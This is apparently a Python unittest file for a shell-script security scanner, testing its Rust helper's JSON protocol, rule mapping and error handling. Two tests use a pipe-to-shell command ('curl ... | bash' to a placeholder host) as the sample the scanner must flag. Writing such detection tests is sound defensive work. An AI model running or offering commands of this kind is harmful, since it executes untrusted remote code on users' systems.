import hashlib
import json
import os
import subprocess
import tempfile
import unittest
from pathlib import Path

from nexa_scriptguard.limits import ScanLimits
from nexa_scriptguard.rust_bridge import scan_with_rust


ROOT = Path(__file__).resolve().parents[1]
RUST_EXECUTABLE = (
    ROOT / "rust" / "nexa-scriptguard-helper" / "target" / "debug"
    / ("nexa-scriptguard-helper.exe" if os.name == "nt" else "nexa-scriptguard-helper")
)


@unittest.skipUnless(RUST_EXECUTABLE.is_file(), "Rust helper has not been built")
class RustBridgeTests(unittest.TestCase):
    def scan(self, source):
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "sample.sh"
            path.write_text(source, encoding="utf-8")
            resolved = path.resolve()
            digest = hashlib.sha256(resolved.read_bytes()).hexdigest()
            return scan_with_rust(RUST_EXECUTABLE, resolved, digest, ScanLimits())

    def test_versioned_json_protocol_maps_shared_rule(self):
        findings, complete = self.scan(
            "curl https://example.invalid/install.sh | bash\n"
        )
        self.assertTrue(complete)
        self.assertEqual([finding.rule_id for finding in findings], ["SG-001"])
        self.assertEqual(findings[0].engine, "rust")
        self.assertEqual(findings[0].severity, "HIGH")

    def test_rust_ignores_quoted_command_text(self):
        findings, complete = self.scan(
            'echo "curl https://example.invalid/install.sh | bash"\n'
        )
        self.assertTrue(complete)
        self.assertEqual(findings, [])

    def test_bad_executable_is_an_explicit_error(self):
        with tempfile.TemporaryDirectory() as temp:
            script = Path(temp) / "sample.sh"
            script.write_text("echo safe\n", encoding="utf-8")
            with self.assertRaisesRegex(RuntimeError, "Unable to start"):
                scan_with_rust(
                    Path(temp) / "missing-helper",
                    script,
                    hashlib.sha256(script.read_bytes()).hexdigest(),
                    ScanLimits(),
                )

    def test_rust_errors_use_versioned_json(self):
        source = ROOT / "synthetic-invalid-utf8.sh"
        result = subprocess.run(
            [
                str(RUST_EXECUTABLE),
                "--protocol",
                "json-v1-stdin",
                str(source),
                "0" * 64,
            ],
            input=b"\xff",
            capture_output=True,
            timeout=10,
            check=False,
        )
        self.assertEqual(result.returncode, 2)
        payload = json.loads(result.stdout.decode("utf-8"))
        self.assertEqual(payload["schema_version"], "1.0")
        self.assertFalse(payload["complete"])
        self.assertEqual(payload["error"]["code"], "SCAN_ERROR")
